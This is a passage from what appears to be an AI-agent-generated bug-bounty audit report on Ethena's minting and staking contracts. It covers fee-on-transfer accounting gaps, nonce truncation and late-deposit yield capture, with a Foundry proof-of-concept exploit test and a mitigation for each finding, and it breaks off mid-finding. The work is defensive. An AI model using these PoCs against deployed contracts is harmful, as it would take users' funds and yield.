# bbp-public-assets Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/bbp-public-assets/report/audit-report.md`
Finding count: `12`

## Findings

### C-1 / `p8uGob3LjBhYLShSbIN0_`
- Finding title: Fee-on-transfer collateral can mint full USDe while custodians receive less collateral
- Report lines: 131-255
```md
## [C-1]. Fee-on-transfer collateral can mint full USDe while custodians receive less collateral

## id: p8uGob3LjBhYLShSbIN0_

## Derived From Pattern/Invariant
FeeOnTransferAssumption

## Exploit Type
FeeOnTransferAssumption

## Location
EthenaMinting.mint

## Finding Status: Valid
### Finding Status Justification: The cited path exists in in-scope production code: EthenaMinting.mint verifies the order and route, consumes the nonce, increments mintedPerBlock, calls _transferCollateral with order.collateral_amount, then mints order.usde_amount. _transferCollateral only calls SafeERC20.safeTransferFrom for nominal split amounts and tracks nominal totalTransferred; it never checks custodian balance deltas or actual tokens received. SafeERC20 only verifies transfer success/return semantics, not net received amount, so fee-on-transfer or deflationary supported collateral can result in less collateral reaching custodians while full USDe is minted. No complete on-chain safeguard rejects fee-on-transfer/rebasing assets or proves exact receipt. The function is in the scoped EthenaMinting.sol. The exact risk is not documented as accepted behavior in the supplied docs. The root cause is currently present and executable if such an asset is in the supported set; this is not merely a future code integration claim because supported assets are configurable in today's code and documentation explicitly calls out non-standard ERC20 behavior as review-relevant. The flow uses the intended permissioned minter path, but does not require privileged abuse or compromised credentials; a role holder submitting a valid accepted order is normal protocol operation. It also does not depend solely on user mistake, since the accounting flaw is the contract minting against nominal rather than received collateral.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
EthenaMinting.mint mints USDe based on the nominal order.collateral_amount after _transferCollateral only checks that ERC20 transferFrom calls succeed. It never measures the actual balance deltas of the custodian route recipients. Vulnerable snippet: `_transferCollateral(order.collateral_amount, order.collateral_asset, order.benefactor, route.addresses, route.ratios); usde.mint(order.beneficiary, order.usde_amount);` and inside `_transferCollateral`: `token.safeTransferFrom(benefactor, addresses[i], amountToTransfer); totalTransferred += amountToTransfer;`. If a supported collateral token takes a transfer fee, rebases, or otherwise credits recipients less than the transfer amount while returning success, the route receives less backing than the signed collateral amount but USDe is minted for the full requested amount.

## Impact
USDe can be over-issued relative to actual collateral delivered to custody, creating an accounting deficit and potential protocol insolvency proportional to the transfer shortfall. Under the Ethena Immunefi rubric this maps to protocol insolvency if such an asset is supported.

## Proof of Concept
1. A fee-on-transfer ERC20 is present in the supported collateral set. 2. A benefactor signs a valid mint order for 100 collateral units and 100 USDe. 3. An address with MINTER_ROLE submits mint with a valid route. 4. _transferCollateral calls safeTransferFrom for 100 nominal units split across custodians, but custodians receive only 98 units after the token fee. 5. usde.mint still mints 100 USDe to the beneficiary and the Mint event reports 100 collateral, leaving USDe over-issued by 2 units of collateral value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/contracts/EthenaMinting.sol";

contract MockUSDe is ERC20 {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(uint256 amount) external { _burn(msg.sender, amount); }
    function burnFrom(address account, uint256 amount) external { _burn(account, amount); }
    function grantRole(bytes32, address) external {}
    function setMinter(address) external {}
}

contract FeeToken is ERC20 {
    constructor() ERC20("Fee", "FEE") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 50;
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount - fee);
        _burn(from, fee);
        return true;
    }
}

contract MockWETH is ERC20 {
    constructor() ERC20("WETH", "WETH") {}
    function deposit() external payable { _mint(msg.sender, msg.value); }
    function withdraw(uint256 wad) external payable { _burn(msg.sender, wad); payable(msg.sender).transfer(wad); }
}

contract EthenaMintingFeeOnTransferPoC is Test {
    EthenaMinting minting;
    MockUSDe usde;
    FeeToken collateral;
    MockWETH weth;
    address admin = address(0xA11CE);
    address minter = address(0xBEEF);
    address benefactor;
    uint256 benefactorPk = 0x1234;
    address beneficiary = address(0xCAFE);
    address custodian = address(0xC057);
    bytes32 constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function setUp() public {
        benefactor = vm.addr(benefactorPk);
        usde = new MockUSDe();
        collateral = new FeeToken();
        weth = new MockWETH();
        address[] memory assets = new address[](1);
        assets[0] = address(collateral);
        address[] memory custodians = new address[](1);
        custodians[0] = custodian;
        minting = new EthenaMinting(IUSDe(address(usde)), IWETH9(address(weth)), assets, custodians, admin, type(uint256).max, type(uint256).max);
        vm.prank(admin);
        minting.grantRole(MINTER_ROLE, minter);
        collateral.mint(benefactor, 100 ether);
        vm.prank(benefactor);
        collateral.approve(address(minting), type(uint256).max);
    }

    function testFeeOnTransferMintsFullUSDeAgainstShortCollateral() public {
        IEthenaMinting.Order memory order = IEthenaMinting.Order({
            order_type: IEthenaMinting.OrderType.MINT,
            expiry: block.timestamp + 1 days,
            nonce: 1,
            benefactor: benefactor,
            beneficiary: beneficiary,
            collateral_asset: address(collateral),
            collateral_amount: 100 ether,
            usde_amount: 100 ether
        });
        bytes32 digest = minting.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(benefactorPk, digest);
        IEthenaMinting.Signature memory sig = IEthenaMinting.Signature({signature_type: IEthenaMinting.SignatureType.EIP712, signature_bytes: abi.encodePacked(r, s, v)});
        address[] memory addresses = new address[](1);
        addresses[0] = custodian;
        uint256[] memory ratios = new uint256[](1);
        ratios[0] = 10000;
        IEthenaMinting.Route memory route = IEthenaMinting.Route({addresses: addresses, ratios: ratios});
        uint256 beforeBal = collateral.balanceOf(custodian);
        vm.prank(minter);
        minting.mint(order, route, sig);
        assertEq(usde.balanceOf(beneficiary), 100 ether);
        assertEq(collateral.balanceOf(custodian) - beforeBal, 98 ether);
        assertGt(order.collateral_amount, collateral.balanceOf(custodian) - beforeBal);
    }
}

## Suggested Mitigation
For minting, measure each custodian's token balance before and after transfer and require the aggregate delta to equal order.collateral_amount before minting USDe, or explicitly reject fee-on-transfer/rebasing/deflationary collateral assets at onboarding and enforce that invariant on-chain where possible. Use actual received amounts for accounting and events.
```

### M-2 / `mwJxMX3nWLUyQBG68VFI6`
- Finding title: Nonce bitmap truncates uint256 nonces to 64 bits causing distinct orders to invalidate each other
- Report lines: 256-369
```md
## [M-2]. Nonce bitmap truncates uint256 nonces to 64 bits causing distinct orders to invalidate each other

## id: mwJxMX3nWLUyQBG68VFI6

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
ReplayAttack

## Location
EthenaMinting.verifyNonce

## Finding Status: Valid
### Finding Status Justification: The root cause is directly present in in-scope EthenaMinting.verifyNonce. Order.nonce is a uint256 and encodeOrder signs the full uint256 nonce, but replay tracking computes invalidatorSlot as uint64(nonce) >> 8 and invalidatorBit as 1 << uint8(nonce). Therefore any two nonzero nonces that differ only above bit 63 map to the same slot and bit. _deduplicateOrder stores that bit for the benefactor, so executing one signed order makes verifyNonce revert for the other even though the EIP-712 hashes and full nonce values differ. There is no complete safeguard: no require bounds nonce to uint64, no mapping tracks the full uint256 nonce, and signature validation does not prevent bitmap aliasing. The code is scoped production code, not test or mock code. The supplied documentation does not explicitly accept nonce aliasing as intentional behavior. The issue is currently exploitable in today's code whenever a signer or delegated signer creates colliding nonce orders; executing one valid order blocks the other. This does not require a privileged actor to be compromised or abusive in the core root-cause sense: a normal authorized executor can process a valid order and trigger the collision side effect. It is not solely victim misuse because the interface exposes uint256 nonces and the contract silently truncates them rather than enforcing the actual supported width.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
EthenaMinting declares order.nonce as uint256 and signs the full nonce in the EIP-712 order, but replay protection only uses the low 64 bits for the bitmap slot and the low 8 bits for the bit. Vulnerable snippet: `uint256 invalidatorSlot = uint64(nonce) >> 8; uint256 invalidatorBit = 1 << uint8(nonce);`. As a result, distinct signed nonces that differ only above bit 63, such as n and n + 2**64, map to the same bitmap entry. Executing either order permanently invalidates the other even though the signed order nonces are different.

## Impact
Valid signed mint or redeem orders can be made unusable by consuming a colliding nonce first. This can grief approved counterparties and temporarily block intended mint/redeem execution until a replacement order is signed, and contradicts the uint256 nonce interface's one-use-per-exact-nonce invariant.

## Proof of Concept
1. A benefactor signs two otherwise valid orders with nonces 1 and 1 + 2**64. 2. Both signatures are distinct because hashOrder includes the full uint256 nonce. 3. A role-authorized executor submits the first order successfully. 4. _deduplicateOrder stores the consumed nonce at slot uint64(1) >> 8 and bit uint8(1). 5. verifyNonce for nonce 1 + 2**64 now reads the same slot and bit and reverts InvalidNonce, so the second signed order cannot execute despite never being used.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/contracts/EthenaMinting.sol";

contract MockUSDeNonce is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(uint256 amount) external { _burn(msg.sender, amount); }
    function burnFrom(address account, uint256 amount) external { _burn(account, amount); }
    function grantRole(bytes32, address) external {}
    function setMinter(address) external {}
}

contract PlainToken is ERC20 {
    constructor() ERC20("Token", "TOK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockWETHNonce is ERC20 {
    constructor() ERC20("WETH", "WETH") {}
    function deposit() external payable { _mint(msg.sender, msg.value); }
    function withdraw(uint256 wad) external payable { _burn(msg.sender, wad); payable(msg.sender).transfer(wad); }
}

contract EthenaMintingNonceCollisionPoC is Test {
    EthenaMinting minting;
    MockUSDeNonce usde;
    PlainToken collateral;
    MockWETHNonce weth;
    address admin = address(0xA11CE);
    address minter = address(0xBEEF);
    address benefactor;
    uint256 benefactorPk = 0x1234;
    address beneficiary = address(0xCAFE);
    address custodian = address(0xC057);
    bytes32 constant MINTER_ROLE = keccak256("MINTER_ROLE");

    function setUp() public {
        benefactor = vm.addr(benefactorPk);
        usde = new MockUSDeNonce();
        collateral = new PlainToken();
        weth = new MockWETHNonce();
        address[] memory assets = new address[](1);
        assets[0] = address(collateral);
        address[] memory custodians = new address[](1);
        custodians[0] = custodian;
        minting = new EthenaMinting(IUSDe(address(usde)), IWETH9(address(weth)), assets, custodians, admin, type(uint256).max, type(uint256).max);
        vm.prank(admin);
        minting.grantRole(MINTER_ROLE, minter);
        collateral.mint(benefactor, 2 ether);
        vm.prank(benefactor);
        collateral.approve(address(minting), type(uint256).max);
    }

    function _sig(IEthenaMinting.Order memory order) internal view returns (IEthenaMinting.Signature memory) {
        bytes32 digest = minting.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(benefactorPk, digest);
        return IEthenaMinting.Signature({signature_type: IEthenaMinting.SignatureType.EIP712, signature_bytes: abi.encodePacked(r, s, v)});
    }

    function testDistinctHighBitNonceCollides() public {
        address[] memory addresses = new address[](1);
        addresses[0] = custodian;
        uint256[] memory ratios = new uint256[](1);
        ratios[0] = 10000;
        IEthenaMinting.Route memory route = IEthenaMinting.Route({addresses: addresses, ratios: ratios});
        IEthenaMinting.Order memory first = IEthenaMinting.Order({order_type: IEthenaMinting.OrderType.MINT, expiry: block.timestamp + 1 days, nonce: 1, benefactor: benefactor, beneficiary: beneficiary, collateral_asset: address(collateral), collateral_amount: 1 ether, usde_amount: 1 ether});
        IEthenaMinting.Order memory second = first;
        second.nonce = 1 + (1 << 64);
        vm.prank(minter);
        minting.mint(first, route, _sig(first));
        vm.expectRevert(IEthenaMinting.InvalidNonce.selector);
        minting.verifyNonce(benefactor, second.nonce);
        vm.prank(minter);
        vm.expectRevert(IEthenaMinting.InvalidNonce.selector);
        minting.mint(second, route, _sig(second));
    }
}

## Suggested Mitigation
Either constrain order.nonce to uint64 in the interface and reject nonce > type(uint64).max, or include the full uint256 nonce in replay tracking, for example mapping(address => mapping(uint256 => bool)) usedNonces. If bitmap packing is retained, document and enforce the nonce width before signing and execution.
```

### H-4 / `ZvancpJ6l3DyWLqr3Xkl0`
- Finding title: Late deposits during reward vesting steal unclaimed yield from existing sUSDe stakers
- Report lines: 449-558
```md
## [H-4]. Late deposits during reward vesting steal unclaimed yield from existing sUSDe stakers

## id: ZvancpJ6l3DyWLqr3Xkl0

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
StakedUSDe.transferInRewards / deposit

## Finding Status: Valid
### Finding Status Justification: This is the same root cause as the StakedUSDeV2 late-deposit reward issue, and it exists in the shared StakedUSDe implementation. transferInRewards() starts an 8 hour vesting tranche, while totalAssets() subtracts the unvested amount. Public deposit/mint uses ERC4626 conversion based on totalAssets(), so a depositor entering after reward funding but before vesting completion receives shares at a price that excludes the funded reward. When vesting completes, the depositor's shares participate pro rata in that reward. The code contains no per-user reward accounting, no snapshot of eligible supply, no minimum holding-period restriction, and no deposit pause during active vesting. The path is in scoped production code, does not require privileged attacker control, and is exploitable whenever normal reward distribution occurs and deposits are open. No documentation in the provided material accepts this exact dilution/free-riding risk as design.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Rewards are accounted as a global vesting amount rather than per-user reward debt, so deposits made after a reward transfer but before the 8 hour vest completes are priced as if the unvested rewards do not exist and then share those same rewards as they vest. The vulnerable accounting is:

function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
  _updateVestingAmount(amount);
  IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);
  emit RewardsReceived(amount);
}

function totalAssets() public view override returns (uint256) {
  return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
}

Because totalAssets subtracts the full unvested reward immediately after transferInRewards(), a late depositor receives shares at the pre-reward exchange rate. When the reward vests, totalAssets increases and the late depositor owns a pro-rata claim on yield funded for earlier stakers. There is no userRewardPerTokenPaid, rewardDebt, user index, snapshot, minimum holding period, or exclusion of post-distribution shares from the current vesting tranche.

## Impact
Theft of unclaimed yield from existing stakers. A large permissionless staker can deposit immediately after each reward distribution and exit after vesting, capturing a pro-rata share of rewards despite not providing capital during the period that generated the yield. Under the Ethena Immunefi rubric this maps to High: theft of unclaimed yield.

## Proof of Concept
1. Alice is the only staker with 100 USDe deposited for 100 sUSDe shares.
2. The rewarder calls transferInRewards(100e18). Immediately after this call the vault holds 200 USDe, but totalAssets() still reports 100 USDe because the 100 USDe reward is unvested.
3. Bob observes the reward transaction and deposits 100 USDe during the vesting window. Because totalAssets() excludes unvested rewards, Bob receives 100 sUSDe shares.
4. After 8 hours, totalAssets() becomes 300 USDe. Alice and Bob each own 50% of the shares.
5. Bob redeems/cooldowns his 100 sUSDe for 150 USDe, extracting 50 USDe of the reward that should have accrued only to the pre-existing staker.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/StakedUSDeV2.sol";

contract MockUSDe is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StakedUSDeLateJoinerPoC is Test {
    MockUSDe usde;
    StakedUSDeV2 vault;
    address admin = address(0xA11CE);
    address rewarder = address(0xBEEF);
    address alice = address(0xA);
    address bob = address(0xB);

    function setUp() public {
        usde = new MockUSDe();
        vault = new StakedUSDeV2(IERC20(address(usde)), rewarder, admin);
        vm.prank(admin);
        vault.setCooldownDuration(0);

        usde.mint(alice, 100 ether);
        usde.mint(bob, 100 ether);
        usde.mint(rewarder, 100 ether);

        vm.prank(alice);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(bob);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(rewarder);
        usde.approve(address(vault), type(uint256).max);
    }

    function testLateJoinerCapturesHistoricalRewardVesting() public {
        vm.prank(alice);
        vault.deposit(100 ether, alice);
        assertEq(vault.balanceOf(alice), 100 ether);

        vm.prank(rewarder);
        vault.transferInRewards(100 ether);
        assertEq(vault.totalAssets(), 100 ether);

        vm.prank(bob);
        vault.deposit(100 ether, bob);
        assertEq(vault.balanceOf(bob), 100 ether);

        vm.warp(block.timestamp + 8 hours);
        assertEq(vault.totalAssets(), 300 ether);

        vm.prank(bob);
        vault.redeem(100 ether, bob, bob);
        assertEq(usde.balanceOf(bob), 150 ether);
        assertEq(usde.balanceOf(alice), 0);
        assertEq(vault.previewRedeem(vault.balanceOf(alice)), 150 ether);
    }
}

## Suggested Mitigation
Track reward accrual with per-user reward debt or per-distribution share snapshots so only shares present at the reward checkpoint receive that reward tranche. Alternatively, add a reward index with userRewardPerTokenPaid, prevent deposits during active vesting, or mint vesting rewards into a separate accumulator that excludes shares minted after the distribution timestamp.
```

### H-5 / `EEBhzRa4U33LvA2ZwroR9`
- Finding title: Late deposits during reward vesting steal unclaimed yield from existing StakedUSDeV2 stakers
- Report lines: 559-687
```md
## [H-5]. Late deposits during reward vesting steal unclaimed yield from existing StakedUSDeV2 stakers

## id: EEBhzRa4U33LvA2ZwroR9

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
AccountingInvariantViolation

## Location
StakedUSDeV2.transferInRewards

## Finding Status: Valid
### Finding Status Justification: The described accounting path exists. transferInRewards() is callable by REWARDER_ROLE and records vestingAmount before transferring USDe in. totalAssets() subtracts getUnvestedAmount(), and ERC4626 deposit share issuance relies on totalAssets(). During the vesting window, newly deposited USDe is priced against assets excluding the already-funded unvested reward, but once the reward vests it increases totalAssets for all current shares, including shares minted after the reward transfer. There is no reward-debt, per-user index, per-distribution snapshot, deposit block during vesting, or exclusion of post-distribution shares from that reward tranche. The attacker only needs normal public deposit/redeem or cooldown flows after a normal reward transfer; the rewarder role is only part of normal protocol operation, not attacker privilege. The behavior is in scoped production staking code and is not explicitly documented as an accepted risk.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
StakedUSDeV2 inherits StakedUSDe's share-based reward vesting. When rewards are transferred, they are stored as vestingAmount and excluded from totalAssets() until they vest:

function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
  _updateVestingAmount(amount);
  IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);
}

function totalAssets() public view override returns (uint256) {
  return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
}

Because ERC4626 deposit/mint share issuance also uses totalAssets(), a user who deposits after transferInRewards but before the 8 hour vesting finishes receives shares priced as if the unvested reward did not exist. As the already-funded reward vests, the late depositor owns a pro-rata claim to it despite not being staked when the reward was distributed. There is no per-user rewardDebt/userRewardPerTokenPaid or distribution snapshot to restrict each reward distribution to pre-existing shares.

## Impact
Theft of unclaimed yield from existing stakers. A late depositor can capture a proportional share of already-funded, unvested rewards, reducing the yield claim of users who were staked when the reward was distributed. Under the Ethena Immunefi impact table this maps to High severity: theft of unclaimed yield.

## Proof of Concept
1. Victim deposits 100 USDe into StakedUSDeV2 and receives 100 sUSDe shares.
2. The authorized rewarder calls transferInRewards(100 USDe). The vault now holds 200 USDe, but totalAssets() remains 100 USDe because the 100 USDe reward is unvested.
3. Attacker permissionlessly deposits 100 USDe during the vesting window. ERC4626 share issuance uses totalAssets() = 100 and totalSupply() = 100, so the attacker receives 100 shares.
4. After the 8 hour vesting window, totalAssets() becomes 300 USDe and totalSupply() is 200 shares.
5. The attacker redeems/cools down 100 shares and receives 150 USDe. The attacker deposited 100 USDe and extracts 50 USDe of the reward that should have accrued to the pre-existing staker. The victim receives only 150 USDe instead of the 200 USDe they would have received as the sole staker at reward funding time.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/USDe.sol";
import "../contracts/StakedUSDeV2.sol";

contract StakedUSDeV2LateJoinerPoC is Test {
    USDe usde;
    StakedUSDeV2 vault;

    address admin = address(0xA11CE);
    address rewarder = address(0xB0B);
    address victim = address(0xCAFE);
    address attacker = address(0xBAD);

    uint256 constant VICTIM_DEPOSIT = 100 ether;
    uint256 constant ATTACKER_DEPOSIT = 100 ether;
    uint256 constant REWARD = 100 ether;

    function setUp() public {
        usde = new USDe(admin);

        vm.startPrank(admin);
        usde.setMinter(admin);
        usde.mint(victim, VICTIM_DEPOSIT);
        usde.mint(attacker, ATTACKER_DEPOSIT);
        usde.mint(rewarder, REWARD);
        vm.stopPrank();

        vault = new StakedUSDeV2(IERC20(address(usde)), rewarder, admin);

        vm.prank(victim);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        usde.approve(address(vault), type(uint256).max);
        vm.prank(rewarder);
        usde.approve(address(vault), type(uint256).max);
    }

    function testLateJoinerStealsUnvestedReward() public {
        vm.prank(victim);
        vault.deposit(VICTIM_DEPOSIT, victim);
        assertEq(vault.balanceOf(victim), 100 ether);
        assertEq(vault.totalAssets(), 100 ether);

        vm.prank(rewarder);
        vault.transferInRewards(REWARD);
        assertEq(usde.balanceOf(address(vault)), 200 ether);
        assertEq(vault.getUnvestedAmount(), 100 ether);
        assertEq(vault.totalAssets(), 100 ether);

        vm.prank(attacker);
        vault.deposit(ATTACKER_DEPOSIT, attacker);
        assertEq(vault.balanceOf(attacker), 100 ether);

        skip(8 hours);
        assertEq(vault.getUnvestedAmount(), 0);
        assertEq(vault.totalAssets(), 300 ether);

        vm.prank(attacker);
        vault.cooldownShares(vault.balanceOf(attacker));
        skip(uint256(vault.cooldownDuration()));
        vm.prank(attacker);
        vault.unstake(attacker);

        vm.prank(victim);
        vault.cooldownShares(vault.balanceOf(victim));
        skip(uint256(vault.cooldownDuration()));
        vm.prank(victim);
        vault.unstake(victim);

        assertEq(usde.balanceOf(attacker), 150 ether);
        assertGt(usde.balanceOf(attacker), ATTACKER_DEPOSIT);
        assertEq(usde.balanceOf(victim), 150 ether);
        assertEq(usde.balanceOf(victim) + usde.balanceOf(attacker), 300 ether);
    }
}


## Suggested Mitigation
Do not let new deposits buy into already-funded unvested rewards. Snapshot totalSupply at each reward distribution and allocate that reward only to pre-distribution shares via per-user reward index/reward debt accounting, or make deposit/mint share conversion include unvested assets while keeping withdrawal logic from releasing unvested rewards. A stricter mitigation is to reject deposits and mints while getUnvestedAmount() > 0.
```

### C-6 / `vpr73qOdd3B0JtWI1OE98`
- Finding title: Fee-on-transfer collateral redemptions burn full USDe while beneficiary receives less collateral
- Report lines: 688-805
```md
## [C-6]. Fee-on-transfer collateral redemptions burn full USDe while beneficiary receives less collateral

## id: vpr73qOdd3B0JtWI1OE98

## Derived From Pattern/Invariant
FeeOnTransferAssumption

## Exploit Type
FeeOnTransferAssumption

## Location
EthenaMinting.redeem

## Finding Status: Valid
### Finding Status Justification: The cited path exists in in-scope production code: EthenaMinting.redeem verifies a signed REDEEM order, consumes the nonce, increments redeemedPerBlock, burns order.usde_amount from the benefactor, then calls _transferToBeneficiary for order.collateral_amount. For ERC20 collateral, _transferToBeneficiary only checks that the asset is supported and calls IERC20(asset).safeTransfer(beneficiary, amount). It does not measure the beneficiary balance before and after transfer, so a fee-on-transfer or deflationary token can make the transfer call succeed while delivering less than the nominal amount. nonReentrant, expiry/signature checks, supported-asset checks, and max-per-block checks do not block this exact short-payment path. The function and asset handling are within scoped EthenaMinting.sol. The supplied docs do not clearly state that redeemers intentionally accept receiving less than the signed collateral amount due to token transfer fees. The root cause exists now and is realistically executable if a currently supported/configurable collateral has fee-on-transfer semantics; this is not dependent on a future contract change. Although redeem is permissioned through REDEEMER_ROLE, the issue can occur during normal role-mediated redemption and does not require the role holder to be compromised or abusive. It is not solely a user mistake because the contract burns full USDe before verifying actual collateral delivery.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
EthenaMinting.redeem burns order.usde_amount before transferring the nominal order.collateral_amount to the beneficiary. For ERC20 collateral, _transferToBeneficiary uses SafeERC20.safeTransfer but does not verify that the beneficiary's balance increased by the requested amount. Vulnerable snippet: `usde.burnFrom(order.benefactor, order.usde_amount); _transferToBeneficiary(order.beneficiary, order.collateral_asset, order.collateral_amount);` and `_transferToBeneficiary`: `IERC20(asset).safeTransfer(beneficiary, amount);`. A supported fee-on-transfer or deflationary collateral can make the redemption succeed while the beneficiary receives less collateral than authorized.

## Impact
Redeemers can lose collateral value while burning the full USDe amount. This is direct loss of user funds in a redemption flow if a supported collateral applies transfer fees or deflationary mechanics.

## Proof of Concept
1. A supported collateral token held by EthenaMinting charges a transfer fee. 2. A benefactor signs a redeem order authorizing burn of 100 USDe for 100 collateral units to the beneficiary. 3. A REDEEMER_ROLE caller submits redeem. 4. redeem burns 100 USDe from the benefactor. 5. _transferToBeneficiary safeTransfers 100 nominal collateral units, but the beneficiary receives only 98 units after token-side fees. 6. The transaction succeeds and emits Redeem for 100 collateral despite the short payment.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../contracts/contracts/EthenaMinting.sol";

contract MockUSDeRedeem is ERC20 {
    constructor() ERC20("USDe", "USDe") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(uint256 amount) external { _burn(msg.sender, amount); }
    function burnFrom(address account, uint256 amount) external { _spendAllowance(account, msg.sender, amount); _burn(account, amount); }
    function grantRole(bytes32, address) external {}
    function setMinter(address) external {}
}

contract FeeTokenRedeem is ERC20 {
    constructor() ERC20("Fee", "FEE") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 50;
        _transfer(msg.sender, to, amount - fee);
        _burn(msg.sender, fee);
        return true;
    }
}

contract MockWETHRedeem is ERC20 {
    constructor() ERC20("WETH", "WETH") {}
    function deposit() external payable { _mint(msg.sender, msg.value); }
    function withdraw(uint256 wad) external payable { _burn(msg.sender, wad); payable(msg.sender).transfer(wad); }
}

contract EthenaMintingRedeemFeePoC is Test {
    EthenaMinting minting;
    MockUSDeRedeem usde;
    FeeTokenRedeem collateral;
    MockWETHRedeem weth;
    address admin = address(0xA11CE);
    address redeemer = address(0xBEEF);
    address benefactor;
    uint256 benefactorPk = 0x1234;
    address beneficiary = address(0xCAFE);
    address custodian = address(0xC057);
    bytes32 constant REDEEMER_ROLE = keccak256("REDEEMER_ROLE");

    function setUp() public {
        benefactor = vm.addr(benefactorPk);
        usde = new MockUSDeRedeem();
        collateral = new FeeTokenRedeem();
        weth = new MockWETHRedeem();
        address[] memory assets = new address[](1);
        assets[0] = address(collateral);
        address[] memory custodians = new address[](1);
        custodians[0] = custodian;
        minting = new EthenaMinting(IUSDe(address(usde)), IWETH9(address(weth)), assets, custodians, admin, type(uint256).max, type(uint256).max);
        vm.prank(admin);
        minting.grantRole(REDEEMER_ROLE, redeemer);
        usde.mint(benefactor, 100 ether);
        vm.prank(benefactor);
        usde.approve(address(minting), type(uint256).max);
        collateral.mint(address(minting), 100 ether);
    }

    function testRedeemBurnsFullUSDeButBeneficiaryReceivesLess() public {
        IEthenaMinting.Order memory order = IEthenaMinting.Order({
            order_type: IEthenaMinting.OrderType.REDEEM,
            expiry: block.timestamp + 1 days,
            nonce: 1,
            benefactor: benefactor,
            beneficiary: beneficiary,
            collateral_asset: address(collateral),
            collateral_amount: 100 ether,
            usde_amount: 100 ether
        });
        bytes32 digest = minting.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(benefactorPk, digest);
        IEthenaMinting.Signature memory sig = IEthenaMinting.Signature({signature_type: IEthenaMinting.SignatureType.EIP712, signature_bytes: abi.encodePacked(r, s, v)});
        vm.prank(redeemer);
        minting.redeem(order, sig);
        assertEq(usde.balanceOf(benefactor), 0);
        assertEq(collateral.balanceOf(beneficiary), 98 ether);
        assertGt(order.collateral_amount, collateral.balanceOf(beneficiary));
    }
}

## Suggested Mitigation
For ERC20 redemptions, measure beneficiary balance before and after transfer and require the actual delta to equal order.collateral_amount, or only allow assets whose transfer semantics guarantee exact 1:1 delivery. Alternatively, include an explicit received-amount/minimum-amount field and revert if actual delivery is below it.
```

### H-7 / `LKzCcTxhNcEQszVVHD1uh`
- Finding title: Zero supply during reward vesting lets first new depositor capture all leftover USDe yield
- Report lines: 806-897
```md
## [H-7]. Zero supply during reward vesting lets first new depositor capture all leftover USDe yield

## id: LKzCcTxhNcEQszVVHD1uh

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
StakedUSDeV2.cooldownShares

## Finding Status: Valid
### Finding Status Justification: The zero-supply path exists, but part of the finding's mechanics are imprecise. StakedUSDeV2.cooldownShares calls _withdraw(), and _checkMinShares() allows totalSupply == 0 because it only reverts for totalSupply > 0 && totalSupply < MIN_SHARES. Thus the last staker can burn all shares during active vesting, moving the currently vested withdrawal amount to the silo while unvested rewards remain in the vault. After vesting, totalAssets can become positive with totalSupply still zero. OpenZeppelin 4.9 ERC4626 does not simply ignore existing assets; its virtual asset/share conversion means a new depositor into a zero-supply, positive-asset vault mints very few shares. But a sufficiently large deposit can satisfy MIN_SHARES and then redeem/cooldown for the deposit plus leftover vested assets, so the root cause and value-capture path remain realistic rather than impossible. No complete safeguard prevents totalSupply from reaching zero while rewards remain, and the behavior is not documented as accepted design.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
